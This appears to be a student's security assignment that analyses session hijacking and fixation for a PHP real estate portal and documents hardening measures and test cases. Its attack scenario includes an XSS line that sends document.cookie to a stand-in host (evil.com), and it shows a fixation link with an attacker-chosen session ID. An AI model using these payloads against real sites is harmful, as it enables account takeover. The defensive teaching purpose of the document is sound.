# Phase 5.4: Session Hijacking & Fixation Analysis
## CIS324 Real Estate Portal - Student: 241-16-034, Section: 19_A

---

## 1. Session Hijacking Analysis

### What is Session Hijacking?
Session hijacking (session sidejacking) occurs when an attacker steals a valid session identifier (session ID) and uses it to impersonate the legitimate user.

### Attack Vectors
| Vector | Description | Risk Level |
|--------|-------------|------------|
| **Network Sniffing** | Intercept unencrypted HTTP traffic (session ID in Cookie header) | High (HTTP) |
| **XSS Theft** | Malicious script reads `document.cookie` and sends to attacker | High (if XSS exists) |
| **Session Prediction** | Guess/brute-force session ID (weak entropy) | Medium |
| **Man-in-the-Middle** | Proxy/SSL strip intercepts session cookie | High (HTTP) |
| **Physical Access** | Steal session from unlocked browser | Low |

### Real Estate Portal Vulnerability Assessment

#### Before Hardening (Vulnerable)
```php
// Default PHP settings - INSECURE
session_start();
// session.cookie_httponly = 0 (accessible via JavaScript)
// session.cookie_secure = 0 (sent over HTTP)
// session.cookie_samesite = '' (no CSRF protection)
// session.use_strict_mode = 0 (allows fixation)
// No session regeneration on login
// No timeout
```

**Attack Scenario:**
1. Attacker performs XSS on property page (if vulnerable)
2. Script: `fetch('http://evil.com/steal?c='+document.cookie)`
3. Attacker gets session ID: `realestate_session=abc123...`
4. Attacker sets cookie in their browser
5. Attacker accesses `/customer/dashboard` as victim

#### After Hardening (Protected)
```php
// app/Config/App.php
'session' => [
    'name' => 'realestate_session',
    'lifetime' => 1800,
    'secure' => true,        // HTTPS only
    'httponly' => true,      // No JS access
    'samesite' => 'Strict',  // CSRF protection
],

// app/Core/Session.php
ini_set('session.use_strict_mode', '1');
ini_set('session.use_only_cookies', '1');
ini_set('session.cookie_httponly', '1');
ini_set('session.cookie_secure', '1');
ini_set('session.cookie_samesite', 'Strict');

// Regeneration on login
public static function login(array $user): void
{
    self::regenerate(true); // New session ID
    // ... set user data
}

// Periodic regeneration (every 5 min)
if (time() - $_SESSION['_last_regeneration'] > 300) {
    self::regenerate();
}

// Timeout (30 min)
public static function checkTimeout(int $lifetime = 1800): bool
{
    if (time() - $_SESSION['user_logged_in_at'] > $lifetime) {
        self::logout();
        return false;
    }
    self::set('user_logged_in_at', time());
    return true;
}
```

### Protection Effectiveness

| Attack Vector | Before | After | Mitigation |
|---------------|--------|-------|------------|
| Network Sniffing | ✅ Vulnerable | 🛡️ Protected | `Secure` flag + HTTPS |
| XSS Cookie Theft | ✅ Vulnerable | 🛡️ Protected | `HttpOnly` flag |
| CSRF via Session | ✅ Vulnerable | 🛡️ Protected | `SameSite=Strict` |
| Session Fixation | ✅ Vulnerable | 🛡️ Protected | `regenerate_id(true)` on login |
| Session Prediction | ✅ Vulnerable | 🛡️ Protected | `use_strict_mode=1` + entropy |
| Long-lived Sessions | ✅ Vulnerable | 🛡️ Protected | 30-min timeout + activity update |

### Residual Risk
- **XSS + HttpOnly bypass**: If XSS exists, attacker can still make authenticated requests via `fetch()` with credentials (cookie sent automatically). Mitigation: CSP + XSS prevention.
- **HTTPS stripping**: If user accesses via HTTP first. Mitigation: HSTS header.
- **Physical access**: No technical mitigation. User education.

---

## 2. Session Fixation Analysis

### What is Session Fixation?
Session fixation occurs when an attacker sets a known session ID for a victim, then waits for the victim to authenticate, thereby gaining access to the authenticated session.

### Attack Flow
```
1. Attacker visits site → Gets session ID: SID_ATTACKER
2. Attacker sends link to victim: http://site.com/login?PHPSESSID=SID_ATTACKER
3. Victim clicks link, logs in with their credentials
4. Server associates victim's auth with SID_ATTACKER
5. Attacker uses SID_ATTACKER → Accesses victim's account
```

### Before Hardening (Vulnerable)
```php
// No session regeneration
public function login(array $user): void
{
    $_SESSION['user_id'] = $user['id'];
    // Session ID remains SID_ATTACKER!
    // Attacker now has authenticated session
}
```

### After Hardening (Protected)
```php
// app/Core/Session.php
public static function login(array $user): void
{
    // CRITICAL: Regenerate ID, delete old session
    self::regenerate(true); 
    
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['user_name'] = $user['name'];
    $_SESSION['user_email'] = $user['email'];
    $_SESSION['user_role'] = $user['role'];
    $_SESSION['user_logged_in_at'] = time();
}

public static function regenerate(bool $deleteOld = true): void
{
    session_regenerate_id($deleteOld); // Creates new SID, deletes old
    $_SESSION['_last_regeneration'] = time();
}
```

### Additional Fixation Prevention
```php
// app/Config/App.php - Strict mode
ini_set('session.use_strict_mode', '1');
// Only accepts server-generated session IDs
// Rejects user-supplied session IDs

ini_set('session.use_only_cookies', '1');
// Prevents session ID in URL (session fixation via URL)
```

### Test Evidence (To Be Executed)
```bash
# Test 1: Fixation Prevention
# 1. Get session ID before login
curl -c cookies.txt http://localhost/login
# 2. Note session ID (e.g., abc123)
# 3. Login with credentials
curl -b cookies.txt -c cookies.txt -X POST http://localhost/login \
  -d "email=user@test.com&password=pass&_csrf_token=TOKEN"
# 4. Check session ID changed
cat cookies.txt
# Expected: NEW session ID (not abc123)

# Test 2: Strict Mode
# Try to set session ID via URL
curl "http://localhost/login?PHPSESSID=attacker_sid"
# Expected: New session ID generated, attacker_sid ignored
```

---

## 3. Implemented Countermeasures Summary

| Countermeasure | Implementation | Session Hijacking | Session Fixation |
|----------------|----------------|-------------------|------------------|
| **HttpOnly Cookie** | `httponly: true` | ✅ Prevents JS theft | - |
| **Secure Cookie** | `secure: true` (HTTPS) | ✅ Prevents sniffing | - |
| **SameSite=Strict** | `samesite: 'Strict'` | ✅ Prevents CSRF | - |
| **Session Regeneration** | `regenerate_id(true)` on login | - | ✅ New ID after auth |
| **Periodic Regeneration** | Every 5 minutes | ✅ Limits exposure window | - |
| **Strict Mode** | `use_strict_mode=1` | - | ✅ Rejects fixed IDs |
| **Cookie-Only Sessions** | `use_only_cookies=1` | - | ✅ No URL session IDs |
| **30-min Timeout** | Inactivity destroys session | ✅ Limits window | - |
| **Activity Tracking** | Updates timestamp per request | ✅ Accurate timeout | - |

---

## 4. Real Estate Portal Specific Considerations

### Role-Based Session Data
```php
// Session stores minimal data
$_SESSION = [
    'user_id' => 4,
    'user_name' => 'Fatema Begum',
    'user_email' => 'customer1@realestate.test',
    'user_role' => 'customer',
    'user_logged_in_at' => 1700000000,
    '_last_regeneration' => 1700000000,
    '_csrf_tokens' => ['token1' => expiry, 'token2' => expiry],
    '_flash' => ['success' => 'Property saved'],
];
```

### Dashboard Access Control
```php
// app/Core/Auth.php - Checked on every protected request
public static function requireAuth(string $redirect = '/login'): void
{
    if (!Session::isLoggedIn()) {
        Session::flash('error', 'Please login');
        Response::redirect($redirect);
    }
    // Check timeout on EVERY request
    if (!Session::checkTimeout()) {
        Session::flash('error', 'Session expired');
        Response::redirect($redirect);
    }
}

public static function requireRole(string|array $roles, string $redirect = '/'): void
{
    self::requireAuth();
    if (!self::hasRole($roles)) {
        Session::flash('error', 'Insufficient permissions');
        Response::redirect($redirect);
    }
}
```

### API Session Handling
```php
// app/Controller/ApiController.php
public static function apiAuth(): ?array
{
    if (!Session::isLoggedIn()) {
        Response::unauthorized('Authentication required');
    }
    if (!Session::checkTimeout()) {
        Response::unauthorized('Session expired');
    }
    return Session::user();
}
```

---

## 5. Evidence for Report (Q7)

### Test Cases to Execute
| Test | Description | Expected |
|------|-------------|----------|
| **SH-01** | Sniff HTTP traffic (non-HTTPS) | No session cookie visible (Secure flag) |
| **SH-02** | XSS attempt to read cookie | `document.cookie` returns empty for session |
| **SH-03** | CSRF attack via external site | Request blocked (SameSite=Strict) |
| **SH-04** | Session timeout after 30 min | Auto logout, redirect to login |
| **SF-01** | Fixation via URL parameter | New session ID generated |
| **SF-02** | Fixation via cookie preset | Login regenerates ID |
| **SF-03** | Strict mode rejects fixed ID | Server generates new ID |

### Screenshots Needed
- [ ] Browser DevTools → Application → Cookies → Secure/HttpOnly/SameSite flags
- [ ] Network tab → Login request → Set-Cookie header analysis
- [ ] Console → `document.cookie` shows no session cookie
- [ ] Network → 30 min idle → Request → 302 redirect to login

---

## 6. Conclusion

**Session Hijacking**: Effectively mitigated through HttpOnly, Secure, SameSite=Strict, CSP, and short timeouts. Residual risk only if XSS + HTTPS bypass both exist.

**Session Fixation**: Effectively prevented through `session_regenerate_id(true)` on login, `use_strict_mode=1`, and `use_only_cookies=1`.

**Both threats addressed with ≥2 hardening measures each** ✅